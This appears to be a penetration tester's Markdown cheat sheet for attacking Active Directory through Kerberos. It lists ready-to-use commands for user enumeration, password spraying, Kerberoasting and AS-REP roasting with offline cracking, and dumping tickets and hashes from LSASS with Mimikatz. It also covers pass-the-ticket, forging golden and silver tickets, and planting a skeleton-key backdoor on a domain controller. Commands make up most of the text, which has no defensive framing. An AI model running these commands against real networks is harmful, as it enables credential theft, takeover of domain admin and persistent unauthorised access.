# active directory

## Kerbrute

(/usr/share/windows-resources/Ghostpack-CompiledBinaries/Rubeus.exe)

```
# enum users
./kerbrute -dc <DOMAIN-CONTROLLER> -d <FULL-DOMAIN> <username-wordlist> -t 50

# harvest all TGTs
Rubeus.exe harvest /interval:30
```

## Attacks

```
# brute force = 1 user and a password-list-dictionary

# pass spray = 1 password & try against all users
Kerbrute.exe brute /password:<PASS> /noticket
```

### kerberoasting

Allows user to request service ticket (ST) for any service w/ registered SPN (service princical name) then use the ST to crack service password

```
# using Rubeus.exe
Rubeus.exe kerberoast
# copy hash and crack using hashcat -m 13100 -a 0 <hash> <passList>

# using Impacket
# dump the Kerberos hash for all kerberoastable accounts
sudo python3 GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DOMAIN-CONTROLLER> -request
```

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users.

### AS-REP Roasting | (only for users with Kerberos pre-authentication disabled)

If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

```
# using Rubeus.exe
# dumps the krbasrep5 hashes of user accounts
Rubeus.exe asreproast
add $23 after $krb5asrep$
hashcat -m 18200 <hash> <PwdList>

# Impacket's GetNPUsers.py
# Enumerate the users > user.txt
GetNPUsers.py <DOMAIN>/ -usersfile user.txt -format hashcat -outputfile hash.asreproast
hashcat -m 18200 <hash> <PwdList>

secretsdump.py <user>@<domain-ip>
```

### Pass-the-ticket using Mimikatz

Can be used for dumping user credentials inside of an AD network Can dump the TGT from the LSASS memory (which stores Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided) Gives a .kirbi ticket - can be used to get domain admin The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin.

```
> mimikatz.exe
# 200 OK = have admin access to run this exe properly
privilege::debug
# exports all .kirbi to current directory
sekurlsa::tickets /export

# find some admin .kirbi from krbtgt
kerberos::ptt <ticket>

# to check if ticket is working
> klist
```

### Golden / Silver ticket attack using Mimikatz

Silver ticket = more sleath and discreet; only for target service Golden ticket = any kerberos service

```
> mimikatz.exe
# 200 OK = have admin access to run this exe properly
privilege::debug

# dump hash and SID to create golden / silver ticket
# golden ticket /name: krbtgt
# silver ticket /name: [<domain-admin-account> | <service-account>]
lsadump::lsa /inject /name: <NAME>

# create ticket golden
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_NTLM_hash> /id:500

# create ticket silver
kerberos::golden /user:<USER> /domain:<DOMAINM> /sid:<SID> /krbtgt:<SERVICE_NTLM_hash> /id:1103

# to access other machines
misc::cmd
```

### Kerberos backdoor using Mimikatz

Works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

```
> mimikatz.exe
# 200 OK = have admin access to run this exe properly
privilege::debug

misc::skeleton
# done, now accessing admin share
> net use C:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
> dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

## Resources:

```
# to find all Kerberoastable accounts
https://github.com/BloodHoundAD/BloodHound/releases

https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
https://github.com/gentilkiwi/kekeo
```
